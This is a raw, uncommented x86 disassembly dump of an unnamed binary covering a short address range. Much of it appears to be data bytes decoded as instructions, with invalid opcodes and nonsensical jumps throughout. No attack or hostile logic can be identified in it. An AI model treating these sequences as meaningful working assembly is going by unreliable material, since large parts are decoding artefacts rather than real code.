  421a9c:	inc    edx
  421a9d:	add    BYTE PTR [eax],al
  421a9f:	mov    al,0x42
  421aa1:	add    BYTE PTR [eax+esi*4],al
  421aa4:	inc    edx
  421aa5:	add    BYTE PTR [eax],cl
  421aa7:	mov    al,0x42
  421aa9:	add    BYTE PTR [eax+esi*4],cl
  421aac:	inc    edx
  421aad:	add    BYTE PTR [eax],dl
  421aaf:	mov    al,0x42
  421ab1:	add    BYTE PTR [eax+esi*4],dl
  421ab4:	inc    edx
  421ab5:	add    BYTE PTR [eax],bl
  421ab7:	mov    al,0x42
  421ab9:	add    BYTE PTR [eax+esi*4],bl
  421abc:	inc    edx
  421abd:	add    BYTE PTR [eax+0x66],bh
  421ac0:	ins    BYTE PTR es:[edi],dx
  421ac1:	jp     0x421b1a
  421ac3:	jbe    0x421b0c
  421ac5:	ja     0x421b0a
  421ac7:	js     0x421b11
  421ac9:	jno    0x421b2e
  421acb:	inc    edx
  421acc:	inc    bx
  421ace:	push   ebp
  421acf:	jno    0x421b47
  421ad1:	ja     0x421b3a
  421ad3:	dec    edi
  421ad4:	dec    esp
  421ad5:	dec    ebp
  421ad6:	inc    edx
  421ad7:	jno    0x421b4a
  421ad9:	jae    0x421b2e
  421adb:	push   eax
  421adc:	arpl   WORD PTR [ebx-0x7a],dx
  421adf:	push   ds
  421ae0:	inc    edx
  421ae1:	add    BYTE PTR [esi+0x2600421e],cl
  421ae7:	sbb    eax,0xbef0042
  421aec:	mov    dl,0xe
  421aee:	jns    0x421b3e
  421af0:	xor    BYTE PTR [esi-0x79],cl
  421af3:	dec    edi
  421af4:	cmp    eax,0x3e4faf4e
  421af9:	dec    esi
  421afa:	js     0x421b4a
  421afc:	cmp    ecx,DWORD PTR [esi-0x64]
  421aff:	dec    edi
  421b00:	inc    esp
  421b01:	dec    esi
  421b02:	jae    0x421b52
  421b04:	inc    ecx
  421b05:	dec    esi
  421b06:	xor    BYTE PTR [esi+0x40],cl
  421b09:	dec    esi
  421b0a:	pop    esp
  421b0b:	pop    ebp
  421b0c:	pop    edi
  421b0d:	push   edx
  421b0e:	cmp    DWORD PTR [esi+0x79],ecx
  421b11:	dec    esi
  421b12:	xor    BYTE PTR [esi-0x79],cl
  421b15:	dec    edi
  421b16:	cmp    eax,0x3e4faf4e
  421b1b:	dec    esi
  421b1c:	js     0x421b6c
  421b1e:	cmp    ecx,DWORD PTR [esi-0x64]
  421b21:	dec    edi
  421b22:	inc    esp
  421b23:	dec    esi
  421b24:	mov    DWORD PTR [edi+0x41],ecx
  421b27:	dec    esi
  421b28:	xor    BYTE PTR [esi+0x40],cl
  421b2b:	dec    esi
  421b2c:	pop    esp
  421b2d:	ins    DWORD PTR es:[edi],dx
  421b2e:	pop    edi
  421b2f:	bound  edi,QWORD PTR [ecx]
  421b31:	dec    esi
  421b32:	jns    0x421b82
  421b34:	xor    BYTE PTR [esi-0x80],cl
  421b37:	dec    edi
  421b38:	cmp    eax,0x394e734e
  421b3d:	dec    esi
  421b3e:	mov    ds:0x304e3a4f,al
  421b43:	dec    esi
  421b44:	inc    esi
  421b45:	dec    esi
  421b46:	pop    esp
  421b47:	jge    0x421ba8
  421b49:	jb     0x421bba
  421b4b:	sub    BYTE PTR [esi-0x7d],0x7e
  421b4f:	xchg   ebx,eax
  421b50:	jns    0x421ae2
  421b52:	aas    
  421b53:	dec    esi
  421b54:	test   BYTE PTR [edi+0x30],cl
  421b57:	dec    esi
  421b58:	test   BYTE PTR [edi+0x3c],cl
  421b5b:	dec    esi
  421b5c:	mov    ds:0x734e394f,al
  421b61:	dec    esi
  421b62:	inc    ebp
  421b63:	dec    esi
  421b64:	xor    BYTE PTR [esi+0x44],cl
  421b67:	dec    esi
  421b68:	pop    esp
  421b69:	lea    ebx,[edi-0x7e]
  421b6c:	outs   dx,DWORD PTR ds:[esi]
  421b6d:	xchg   edx,eax
  421b6e:	outs   dx,BYTE PTR ds:[esi]
  421b6f:	xchg   ebx,eax
  421b70:	jle    0x421b15
  421b72:	jns    0x421b14
  421b74:	aas    
  421b75:	dec    esi
  421b76:	test   BYTE PTR [edi+0x30],cl
  421b79:	dec    esi
  421b7a:	test   BYTE PTR [edi+0x3c],cl
  421b7d:	dec    esi
  421b7e:	mov    ds:0x894e394f,al
  421b83:	dec    edi
  421b84:	inc    ebp
  421b85:	dec    esi
  421b86:	xor    BYTE PTR [esi+0x44],cl
  421b89:	dec    esi
  421b8a:	pop    esp
  421b8b:	popf   
  421b8c:	pop    edi
  421b8d:	xchg   edx,eax
  421b8e:	outs   dx,DWORD PTR ds:[esi]
  421b8f:	mov    ds:0xb37ea36e,al
  421b94:	jns    0x421b46
  421b96:	aas    
  421b97:	dec    esi
  421b98:	mov    cs,WORD PTR [edi+0x30]
  421b9b:	dec    esi
  421b9c:	lods   al,BYTE PTR ds:[esi]
  421b9d:	dec    edi
  421b9e:	cmp    eax,0x394e734e
  421ba3:	dec    esi
  421ba4:	mov    eax,ds:0x304e3a4f
  421ba9:	dec    esi
  421baa:	inc    esp
  421bab:	dec    esi
  421bac:	pop    esp
  421bad:	lods   eax,DWORD PTR ds:[esi]
  421bae:	pop    edi
  421baf:	mov    ds:0xb36eb26f,al
  421bb4:	jle    0x421b79
  421bb6:	jns    0x421b78
  421bb8:	aas    
  421bb9:	dec    esi
  421bba:	mov    cs,WORD PTR [edi+0x30]
  421bbd:	dec    esi
  421bbe:	lods   al,BYTE PTR ds:[esi]
  421bbf:	dec    edi
  421bc0:	cmp    eax,0x394e7e4e
  421bc5:	dec    esi
  421bc6:	lahf   
  421bc7:	dec    edi
  421bc8:	cmp    ecx,DWORD PTR [esi+0x30]
  421bcb:	dec    esi
  421bcc:	inc    ebp
  421bcd:	dec    esi
  421bce:	pop    esp
  421bcf:	mov    ebp,0xc26fb25f
  421bd4:	outs   dx,BYTE PTR ds:[esi]
  421bd5:	ret    
  421bd6:	jle    0x421bab
  421bd8:	jns    0x421baa
  421bda:	aas    
  421bdb:	dec    esi
  421bdc:	mov    cs,WORD PTR [edi+0x30]
  421bdf:	dec    esi
  421be0:	lods   al,BYTE PTR ds:[esi]
  421be1:	dec    edi
  421be2:	cmp    eax,0x394f804e
  421be7:	dec    esi
  421be8:	lods   al,BYTE PTR ds:[esi]
  421be9:	dec    edi
  421bea:	cmp    cl,BYTE PTR [esi+0x30]
  421bed:	dec    esi
  421bee:	inc    esi
  421bef:	dec    esi
  421bf0:	pop    esp
  421bf1:	int    0x5f
  421bf3:	ret    0xd26f
  421bf6:	outs   dx,BYTE PTR ds:[esi]
  421bf7:	sar    DWORD PTR [esi-0x1d],cl
  421bfa:	jns    0x421bdc
  421bfc:	aas    
  421bfd:	dec    esi
  421bfe:	mov    cs,WORD PTR [edi+0x30]
  421c01:	dec    esi
  421c02:	lods   al,BYTE PTR ds:[esi]
  421c03:	dec    edi
  421c04:	cmp    eax,0x394f834e
  421c09:	dec    esi
  421c0a:	mov    ds:0x304e3a4f,al
  421c0f:	dec    esi
  421c10:	inc    esp
  421c11:	dec    esi
  421c12:	pop    esp
  421c13:	fstp   QWORD PTR [edi-0x2e]
  421c16:	outs   dx,DWORD PTR ds:[esi]
  421c17:	loop   0x421c87
  421c19:	jecxz  0x421c99
  421c1b:	repz jns 0x421c0e
  421c1e:	aas    
  421c1f:	dec    esi
  421c20:	lea    ecx,[edi+0x30]
  421c23:	dec    esi
  421c24:	lahf   
  421c25:	dec    edi
  421c26:	cmp    eax,0x3c4fa04e
  421c2b:	dec    esi
  421c2c:	xor    BYTE PTR [esi+0x3f],cl
  421c2f:	dec    esi
  421c30:	pop    esp
  421c31:	in     eax,dx
  421c32:	pop    edi
  421c33:	loop   0x421ca4
  421c35:	repnz outs dx,BYTE PTR ds:[esi]
  421c37:	repz jle 0x421c3d
  421c3a:	jns    0x421c3c
  421c3c:	jle    0x421c51
  421c3e:	jns    0x421c50
  421c40:	cmp    al,0x4e
  421c42:	jg     0x421c92
  421c44:	xor    BYTE PTR [esi-0x65],cl
  421c47:	dec    edi
  421c48:	xor    cl,BYTE PTR [esi-0x80]
  421c4b:	dec    edi
  421c4c:	cmp    al,0x4e
  421c4e:	lods   eax,DWORD PTR ds:[esi]
  421c4f:	dec    edi
  421c50:	cmp    ecx,DWORD PTR [esi+0x30]
  421c53:	dec    esi
  421c54:	inc    ebp
  421c55:	dec    esi
  421c56:	pop    esp
  421c57:	or     eax,0x126f025f
  421c5c:	outs   dx,BYTE PTR ds:[esi]
  421c5d:	adc    edi,DWORD PTR [esi+0x23]
  421c60:	jns    0x421c82
  421c62:	aas    
  421c63:	dec    esi
  421c64:	add    BYTE PTR [eax],al
  421c66:	out    dx,al
  421c67:	sbb    al,BYTE PTR [edx+0x0]
  421c6a:	loop   0x421c88
  421c6c:	inc    edx
  421c6d:	add    dl,ch
  421c6f:	sbb    al,0x42
  421c71:	add    BYTE PTR [edx-0x1ffbde2],dl
  421c77:	sbb    eax,0x1e820042
  421c7c:	inc    edx
  421c7d:	add    dl,cl
  421c7f:	sbb    al,0x42
  421c81:	add    dh,cl
  421c83:	sbb    al,0x42
  421c85:	add    BYTE PTR [esi+0x1e],bh
  421c88:	inc    edx
  421c89:	add    BYTE PTR [edx],dh
  421c8b:	sbb    eax,0xa90d0042
  421c90:	pushf  
  421c91:	clc    
  421c92:	ss mov edx,0x1ce6f89c
  421c98:	inc    edx
  421c99:	add    BYTE PTR [esi-0x35ffbde3],dh
  421c9f:	sbb    eax,0x1dd60042
  421ca4:	inc    edx
  421ca5:	add    dh,ah
  421ca7:	sbb    eax,0x1d1e0042
  421cac:	inc    edx
  421cad:	add    dl,ch
  421caf:	sbb    al,BYTE PTR [edx+0x0]
  421cb2:	ds sbb eax,0x1d2e0042
  421cb8:	inc    edx
  421cb9:	add    BYTE PTR [esi-0x49ffbde2],dl
  421cbf:	test   DWORD PTR [eax+edi*8-0x7ee8f4e7],ebx
  421cc6:	repnz sbb al,0x42
  421cc9:	add    BYTE PTR [esp+ebx*1],dl
  421ccc:	push   ss
  421ccd:	or     DWORD PTR [eax],0x7050d
  421cd3:	add    BYTE PTR [eax+0x0],al
  421cd6:	cmp    al,BYTE PTR [edx+0x3e]
  421cd9:	ds enter 0x4279,0x0
  421cde:	ins    DWORD PTR es:[edi],dx
  421cdf:	push   ebp
  421ce0:	inc    esp
  421ce1:	imul   ecx,DWORD PTR [eax],0x86275fa
  421ce7:	in     eax,dx
  421ce8:	inc    BYTE PTR [edi]
  421cea:	aas    
  421ceb:	cli    
  421cec:	mov    ds:0x421cda05,eax
  421cf1:	add    BYTE PTR [ebp-0x4a07636b],dh
  421cf7:	xchg   esi,eax
  421cf8:	pushf  
  421cf9:	clc    
  421cfa:	mov    ah,0x95
  421cfc:	pushf  
  421cfd:	clc    
  421cfe:	mov    ebx,0xbaf89c95
  421d03:	xchg   ebp,eax
  421d04:	pushf  
  421d05:	clc    
  421d06:	mov    ecx,0xb8f89c95
  421d0b:	xchg   ebp,eax
  421d0c:	pushf  
  421d0d:	clc    
  421d0e:	mov    edi,0xbef89c95
  421d13:	xchg   ebp,eax
  421d14:	pushf  
  421d15:	clc    
  421d16:	mov    ebp,0xa6f89c95
  421d1b:	xchg   ebp,eax
  421d1c:	pushf  
  421d1d:	clc    
  421d1e:	jmp    0x421a:0xe26003f9
  421d25:	add    BYTE PTR [eax+eax*2+0x42],ch
  421d29:	add    BYTE PTR [ebx+0x77],dl
  421d2c:	jbe    0x421d7e
  421d2e:	mov    dh,0x85
  421d30:	pushf  
  421d31:	clc    
  421d32:	sbb    ecx,ebp
  421d34:	push   eax
  421d35:	pop    es
  421d36:	sbb    BYTE PTR [ebx],cl
  421d38:	add    BYTE PTR [eax],al
  421d3a:	ficomp WORD PTR [edx]
  421d3c:	inc    edx
  421d3d:	add    BYTE PTR [ebx],bl
  421d3f:	or     eax,DWORD PTR [esi+ecx*1]
	...
  421d72:	ins    BYTE PTR es:[edi],dx
  421d73:	inc    eax
  421d74:	inc    edx
  421d75:	add    BYTE PTR [esi+0x66f89c85],dh
  421d7b:	add    BYTE PTR [edx+0x0],ch
  421d7e:	add    BYTE PTR [si+0x0],ah
  421d82:	push   0x64006700
  421d87:	add    BYTE PTR [esi+0x0],ah
  421d8a:	push   0x0
  421d8c:	push   0x66006400
  421d91:	add    BYTE PTR [edi+0x0],ah
  421d94:	push   0x0
  421d96:	push   0x66006700
  421d9b:	add    BYTE PTR [eax+0x0],ch
  421d9e:	add    BYTE PTR [bp+0x0],ah
  421da2:	push   0x66006700
	...
  421daf:	add    BYTE PTR [eax],al
  421db1:	add    BYTE PTR [ecx-0x5affbfa4],cl
  421db7:	dec    edi
  421db8:	lahf   
  421db9:	dec    edi
  421dba:	mov    ds:0x9f4fa64f,al
  421dbf:	dec    edi
  421dc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421dc1:	dec    edi
  421dc2:	ins    DWORD PTR es:[edi],dx
  421dc3:	dec    esi
  421dc4:	bound  ecx,QWORD PTR [esi+0x30]
  421dc7:	dec    esi
  421dc8:	add    BYTE PTR [eax],al
  421dca:	cdq    
  421dcb:	dec    edi
  421dcc:	pushf  
  421dcd:	dec    edi
  421dce:	fwait
  421dcf:	dec    edi
  421dd0:	ins    DWORD PTR es:[edi],dx
  421dd1:	dec    esi
  421dd2:	bound  ecx,QWORD PTR [esi+0x30]
  421dd5:	dec    esi
  421dd6:	scas   eax,DWORD PTR es:[edi]
  421dd7:	dec    edi
  421dd8:	lods   eax,DWORD PTR ds:[esi]
  421dd9:	dec    edi
  421dda:	lahf   
  421ddb:	dec    edi
  421ddc:	mov    ds:0x624e6d4f,al
  421de1:	dec    esi
  421de2:	xor    BYTE PTR [esi+0x0],cl
  421de5:	add    BYTE PTR [ebp-0x5bb067b1],ch
  421deb:	dec    edi
  421dec:	test   eax,0xa04f934f
  421df1:	dec    edi
  421df2:	fwait
  421df3:	dec    edi
  421df4:	xor    BYTE PTR [esi+0x0],cl
  421df7:	add    BYTE PTR [eax],al
  421df9:	add    BYTE PTR [eax],al
  421dfb:	add    BYTE PTR [eax],al
  421dfd:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  421e04:	mov    WORD PTR [ebp-0x32734274],gs
  421e0a:	mov    ebp,ds
  421e0c:	mov    ebp,gs
  421e0e:	mov    ebp,?
  421e10:	mov    WORD PTR ds:0x2d8c1d8c,cs
  421e16:	mov    WORD PTR ds:0x6d8c5d8c,?
  421e1c:	mov    WORD PTR [edx-0x74],?
  421e1f:	jae    0x421dad
  421e21:	jo     0x421daf
  421e23:	jno    0x421db1
  421e25:	jbe    0x421db3
  421e27:	ja     0x421db5
  421e29:	je     0x421db7
  421e2b:	jne    0x421db9
  421e2d:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  421e34:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  421e3a:	lods   al,BYTE PTR ds:[esi]
  421e3b:	jge    0x421df9
  421e3d:	jge    0x421ddd
  421e3f:	(bad)  
  421e40:	jns    0x421eb5
  421e42:	mov    ecx,0x7d738cb1
  421e47:	ins    DWORD PTR es:[edi],dx
  421e48:	enter  0x9fc6,0x26
  421e4c:	jb     0x421e51
  421e4e:	test   eax,0xb956bb17
  421e53:	hlt    
  421e54:	test   al,0x37
  421e56:	test   al,0x7e
  421e58:	fnstenv [ecx-0x6a]
  421e5b:	mov    cl,0x6a
  421e5d:	push   0xffffffce
  421e5f:	or     BYTE PTR [edx],bl
  421e61:	xlat   BYTE PTR ds:[ebx]
  421e62:	out    dx,eax
  421e63:	add    eax,0x9321d7aa
  421e68:	scas   al,BYTE PTR es:[edi]
  421e69:	adc    DWORD PTR [esi],esp
  421e6b:	jge    0x421e90
  421e6d:	fidiv  WORD PTR [edi]
  421e6f:	leave  
  421e70:	hlt    
  421e71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e72:	cmp    ax,0x1fc8
  421e76:	mov    dh,cl
  421e78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e79:	(bad)  
  421e7a:	and    DWORD PTR [eax],ebx
  421e7c:	and    DWORD PTR [ecx-0x18],esi
  421e7f:	(bad)  [ebx+0x7]
  421e82:	cmc    
  421e83:	enter  0x301a,0x14
  421e87:	inc    eax
  421e88:	inc    edx
  421e89:	add    BYTE PTR [ecx+0x66],dh
  421e8c:	jp     0x421efc
  421e8e:	rcr    BYTE PTR [edx+eax*2],cl
  421e91:	add    BYTE PTR [esi],dh
  421e93:	sbb    eax,0xed080042
  421e98:	adc    al,BYTE PTR [edi]
  421e9a:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  421ea1:	ins    BYTE PTR es:[edi],dx
  421ea2:	push   0x49657557
  421ea7:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  421ead:	push   edi
  421eae:	jp     0x421f2a
  421eb0:	dec    ebp
  421eb1:	push   esi
  421eb2:	arpl   WORD PTR gs:[ecx+0x45],si
  421eb6:	dec    edx
  421eb7:	dec    esi
  421eb8:	data16 ja 0x421f09
  421ebb:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
	...
  421ed6:	inc    ebp
  421ed7:	push   edx
  421ed8:	jb     0x421f4e
  421eda:	inc    esi
  421edb:	je     0x421f1e
  421edd:	inc    esi
  421ede:	jae    0x421f56
  421ee0:	dec    ebx
  421ee1:	gs dec ecx
  421ee3:	dec    ebp
  421ee4:	dec    ebp
  421ee5:	pop    edx
  421ee6:	jp     0x421f42
  421ee8:	jbe    0x421f30
  421eea:	pop    ecx
  421eeb:	jo     0x421f65
  421eed:	inc    edi
  421eee:	gs ins BYTE PTR es:[edi],dx
  421ef0:	dec    esp
  421ef1:	js     0x421f5b
  421ef3:	inc    edx
  421ef4:	js     0x421f3c
  421ef6:	dec    eax
  421ef7:	inc    ebp
  421ef8:	inc    esp
  421ef9:	inc    esp
  421efa:	push   ecx
  421efb:	dec    edx
  421efc:	ins    BYTE PTR es:[edi],dx
  421efd:	dec    ebx
  421efe:	jbe    0x421f6e
  421f00:	pop    eax
  421f01:	jbe    0x421f4e
  421f03:	inc    ecx
  421f04:	fs gs jno 0x421f75
  421f08:	push   ebx
  421f09:	inc    ecx
  421f0a:	add    BYTE PTR [eax],al
  421f0c:	inc    ebx
  421f0d:	outs   dx,BYTE PTR ds:[esi]
  421f0e:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  421f12:	push   edx
  421f13:	push   ecx
  421f14:	push   0x74000064
  421f19:	jne    0x421f90
  421f1b:	ins    DWORD PTR es:[edi],dx
  421f1c:	push   ecx
  421f1d:	push   eax
  421f1e:	jo     0x421f9a
  421f20:	addr16 jo 0x421f79
  421f23:	pop    eax
  421f24:	add    BYTE PTR [eax],al
  421f26:	push   ecx
  421f27:	pop    ecx
  421f28:	inc    ebx
  421f29:	inc    edx
  421f2a:	outs   dx,BYTE PTR ds:[esi]
  421f2b:	popa   
  421f2c:	imul   eax,DWORD PTR [edx+0x61],0x6b
  421f30:	jne    0x421fa0
  421f32:	dec    ebx
  421f33:	je     0x421f98
  421f35:	bound  esp,QWORD PTR [edi+0x0]
  421f38:	jns    0x421f7f
  421f3a:	bound  ebp,QWORD PTR [ecx+0x46]
  421f3d:	dec    ecx
  421f3e:	ja     0x421f85
  421f40:	dec    eax
  421f41:	inc    ebp
  421f42:	inc    edx
  421f43:	push   ebx
  421f44:	add    BYTE PTR [eax],al
  421f46:	outs   dx,DWORD PTR ds:[esi]
  421f47:	inc    edi
  421f48:	dec    esi
  421f49:	outs   dx,DWORD PTR ds:[esi]
  421f4a:	pop    ecx
  421f4b:	inc    edi
  421f4c:	jb     0x421f95
  421f4e:	jns    0x421fc6
  421f50:	inc    ecx
  421f51:	pop    eax
  421f52:	dec    esp
  421f53:	add    BYTE PTR [eax+0x48],bh
  421f56:	bound  edx,QWORD PTR [ebx+0x43]
  421f59:	pop    eax
  421f5a:	outs   dx,DWORD PTR ds:[esi]
  421f5b:	push   0x4355
  421f60:	dec    esp
  421f61:	ins    BYTE PTR es:[edi],dx
  421f62:	inc    edx
  421f63:	push   0x76666a73
  421f68:	inc    edx
  421f69:	jo     0x421f6b
  421f6b:	add    BYTE PTR [eax],al
  421f6d:	add    BYTE PTR [edi+0x6d],ah
  421f70:	je     0x421fb9
  421f72:	ins    BYTE PTR es:[edi],dx
  421f73:	jae    0x421fdf
  421f75:	inc    esi
  421f76:	ins    DWORD PTR es:[edi],dx
  421f77:	je     0x421fcf
  421f79:	push   0x56584178
  421f7e:	push   ebx
  421f7f:	addr16 dec edx
  421f81:	jo     0x421ff5
  421f83:	js     0x421ff4
  421f85:	pop    eax
  421f86:	dec    ebx
  421f87:	push   esp
  421f88:	dec    esp
  421f89:	jns    0x421fd6
  421f8b:	js     0x422005
  421f8d:	outs   dx,BYTE PTR ds:[esi]
  421f8e:	pop    ecx
  421f8f:	jae    0x421fff
  421f91:	push   0x43644448
  421f96:	arpl   WORD PTR [edx+0x55],sp
  421f99:	push   0x42504e67
  421f9e:	push   ebp
  421f9f:	je     0x422016
  421fa1:	addr16 dec edi
  421fa3:	dec    esp
  421fa4:	inc    edx
  421fa5:	ins    DWORD PTR es:[edi],dx
  421fa6:	inc    esi
  421fa7:	inc    esi
  421fa8:	inc    esi
  421fa9:	arpl   WORD PTR [edx+0x47],bx
  421fac:	push   ebp
  421fad:	inc    ebx
  421fae:	popa   
  421faf:	push   edx
  421fb0:	dec    esp
  421fb1:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  421fb8:	push   ecx
  421fb9:	push   ebx
  421fba:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  421fc1:	dec    edx
  421fc2:	jns    0x42202d
  421fc4:	push   edx
  421fc5:	inc    ebx
  421fc6:	jo     0x42203d
  421fc8:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  421fcc:	fs push ebx
  421fce:	inc    ebx
  421fcf:	push   ebp
  421fd0:	push   eax
  421fd1:	ja     0x42200e
  421fd3:	fisttp QWORD PTR [ebp+ebp*4-0x12]
  421fd7:	mov    ebp,0xa53ddffb
  421fdc:	js     0x421f97
  421fde:	popa   
  421fdf:	xlat   BYTE PTR ds:[ebx]
  421fe0:	sahf   
  421fe1:	lods   al,BYTE PTR ds:[esi]
  421fe2:	pop    edx
  421fe3:	(bad)  
  421fe4:	add    DWORD PTR [eax],eax
  421fe6:	pop    ebx
  421fe7:	add    BYTE PTR [eax],al
  421fe9:	add    BYTE PTR [edi+0xd],ah
  421fec:	jge    0x421f7b
  421fee:	dec    eax
  421fef:	(bad)  
  421ff0:	pop    eax
  421ff1:	fistp  WORD PTR [esi+0x37d17d32]
  421ff7:	adc    BYTE PTR [eax-0x127e260e],0x29
  421ffe:	std    
  421fff:	fldcw  WORD PTR [eax-0x6b96e96b]
  422005:	mov    al,0x6c
  422007:	pop    edi
  422008:	stc    
  422009:	test   ebx,edx
  42200b:	mov    ebp,0x781ee4d7
  422010:	cwde   
  422011:	inc    ebp
  422012:	push   ss
  422013:	mov    ds:0xcfd75bdd,eax
  422018:	add    eax,0x62fbfc0b
  42201d:	cmp    BYTE PTR [edi-0x34bdfe7],dh
  422023:	scas   al,BYTE PTR es:[edi]
  422024:	icebp  
  422025:	pop    edx
  422026:	cmp    DWORD PTR ds:0x2784bb65,eax
  42202c:	outs   dx,BYTE PTR ds:[esi]
  42202d:	in     ax,dx
  42202f:	mov    al,0x19
  422031:	push   ds
  422032:	inc    esp
  422033:	(bad)  
  422034:	mov    eax,0xc72c56b0
  422039:	jecxz  0x42200d
  42203b:	ret    
  42203c:	frstor [esi-0x32]
  42203f:	inc    edx
  422040:	push   edx
  422041:	mov    ch,cl
  422043:	cmp    al,0x23
	...
  422051:	add    BYTE PTR [eax],ch
  422053:	mov    dl,0xa5
  422055:	push   edx
  422056:	mov    edi,0x7cfaff57
  42205b:	xlat   BYTE PTR fs:[ebx]
  42205d:	push   esi
  42205e:	arpl   di,dx
  422060:	cld    
  422061:	pushf  
  422062:	mov    ch,0xd6
  422064:	add    DWORD PTR [eax],eax
  422066:	pop    ebx
  422067:	add    BYTE PTR [eax],al
  422069:	add    BYTE PTR [ecx+0x5e],ah
  42206c:	mov    ebp,0xbf9e0c41
  422071:	dec    ecx
  422073:	lods   al,BYTE PTR ds:[esi]
  422074:	jmp    0x7b59:0x3841987a
  42207b:	outs   dx,BYTE PTR ds:[esi]
  42207c:	out    0x1c,eax
  42207e:	fstp   QWORD PTR [edi+eiz*8-0x7a]
  422082:	jge    0x4220dd
  422084:	pop    esi
  422085:	hlt    
  422086:	xor    esp,ebp
  422088:	sbb    BYTE PTR [ecx],al
  42208a:	leave  
  42208b:	test   edx,esi
  42208d:	xchg   BYTE PTR [eax-0x44],bh
  422090:	mov    WORD PTR [ecx-0x21],?
  422093:	add    BYTE PTR [edx+0x15],ah
  422096:	pop    edx
  422097:	jae    0x422023
  422099:	xchg   esi,ecx
  42209b:	mov    dl,0x55
  42209d:	fiadd  DWORD PTR [ecx]
  42209f:	fadd   DWORD PTR [edi-0x2a4c4e34]
  4220a5:	fadd   DWORD PTR [edx+0x36]
  4220a8:	je     0x4220ea
  4220aa:	dec    ebp
  4220ab:	in     al,0xd9
  4220ad:	xchg   ecx,eax
  4220ae:	lea    eax,[ebp+0x33]
  4220b1:	clc    
  4220b2:	cs mov ah,0x64
  4220b5:	sub    al,0x9
  4220b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220b8:	rol    DWORD PTR [edx-0x54],0xe8
  4220bc:	adc    eax,0x39f4c086
  4220c1:	mov    esp,0x63cb45
	...
  4220d2:	mov    bl,0x55
  4220d4:	jg     0x422057
  4220d6:	jmp    FWORD PTR [ebx-0x69418801]
  4220dc:	push   0xb4d63657
  4220e1:	add    DWORD PTR [eax],edx
  4220e3:	xlat   BYTE PTR ds:[ebx]
  4220e4:	add    DWORD PTR [eax],eax
  4220e6:	pop    ebx
  4220e7:	add    BYTE PTR [eax],al
  4220e9:	add    BYTE PTR [ecx+0x58951646],ch
  4220ef:	xor    BYTE PTR [edx+ecx*4-0x7c],0xaa
  4220f4:	aam    0x56
  4220f6:	pop    edi
  4220f7:	sar    BYTE PTR [ecx],0x74
  4220fa:	pop    ebp
  4220fb:	sub    edx,esp
  4220fd:	(bad)  
  4220ff:	xor    al,0x1d
  422101:	mov    ecx,0xc49c4840
  422106:	icebp  
  422107:	push   ss
  422108:	sub    dh,dl
  42210a:	daa    
  42210b:	gs dec edi
  42210d:	loopne 0x422116
  42210f:	je     0x422118
  422111:	jo     0x422186
  422113:	out    0x67,al
  422115:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422116:	sahf   
  422117:	adc    DWORD PTR [eax+eax*2],0x9
  42211b:	std    
  42211c:	shl    DWORD PTR [esp+ecx*2],0x32
  422120:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422121:	inc    esp
  422122:	ds lock add eax,0x3c6ec328
  422129:	push   esp
  42212a:	retf   
  42212b:	iret   
  42212c:	dec    DWORD PTR [eax+0x74]
  42212f:	xor    al,0xad
  422131:	and    ah,BYTE PTR [esi-0x3c9b6e17]
  422137:	or     eax,DWORD PTR [esi]
  422139:	xor    ah,BYTE PTR [ecx]
  42213b:	pop    ds
  42213c:	or     dh,BYTE PTR [edx]
  42213e:	int    0x93
  422140:	test   BYTE PTR [edx],bl
  422142:	dec    esp
  422143:	div    bh
	...
  422151:	add    BYTE PTR [eax],bh
  422153:	(bad)  
  422154:	cmp    ah,BYTE PTR [esi+edi*8]
  422157:	in     al,dx
  422158:	fimul  WORD PTR ds:[edi-0x1b53942b]
  42215f:	cmp    ecx,ebp
  422161:	pop    es
  422162:	imul   edx,edi,0x1
  422165:	add    BYTE PTR [ebx+0x0],bl
  422168:	add    BYTE PTR [eax],al
  42216a:	mov    dl,0x24
  42216c:	faddp  st(1),st
  42216e:	mov    esi,DWORD PTR ds:0xf6840ce7
  422174:	mov    cl,dh
  422176:	mov    esi,0xf02d7e7
  42217b:	xchg   ebx,eax
  42217c:	std    
  42217d:	inc    esi
  42217e:	iret   
  42217f:	jae    0x4221ef
  422181:	inc    esi
  422182:	sub    bl,ah
  422184:	mov    edi,0x71de78a9
  422189:	mov    cl,BYTE PTR [ecx]
  42218b:	(bad)  
  42218c:	or     bh,cl
  42218e:	and    eax,0xb171857a
  422193:	(bad)  
  422195:	mov    ebx,0xafb9454b
  42219a:	pop    esi
  42219b:	pop    edx
  42219c:	outs   dx,BYTE PTR ds:[esi]
  42219d:	add    ebp,DWORD PTR [edi-0x3288bc54]
  4221a3:	cmp    BYTE PTR [eax+ecx*2-0x33],dl
  4221a7:	not    BYTE PTR [edx+0x39f9f25a]
  4221ad:	adc    BYTE PTR [ecx],al
  4221af:	popf   
  4221b0:	popf   
  4221b1:	ds leave 
  4221b3:	cmp    ebp,ebx
  4221b5:	pinsrw mm1,WORD PTR [edi+0x6e],0x9c
  4221ba:	ins    DWORD PTR es:[edi],dx
  4221bb:	jnp    0x4221dd
  4221bd:	mov    bl,0x1f
  4221bf:	in     eax,dx
  4221c0:	iret   
  4221c1:	jle    0x42216d
  4221c3:	adc    al,0xcb
	...
  4221d1:	add    cl,bl
  4221d3:	mov    dh,0x66
  4221d5:	sbb    ebp,DWORD PTR [edi-0x25]
  4221d8:	std    
  4221d9:	neg    BYTE PTR [esi]
  4221db:	sub    esp,DWORD PTR [ebx-0x23]
  4221de:	jle    0x42216b
  4221e0:	sub    ah,dl
  4221e2:	(bad)  
  4221e3:	xlat   BYTE PTR ds:[ebx]
  4221e4:	add    DWORD PTR [eax],eax
  4221e6:	pop    ebx
  4221e7:	add    BYTE PTR [eax],al
  4221e9:	add    BYTE PTR [ebx],al
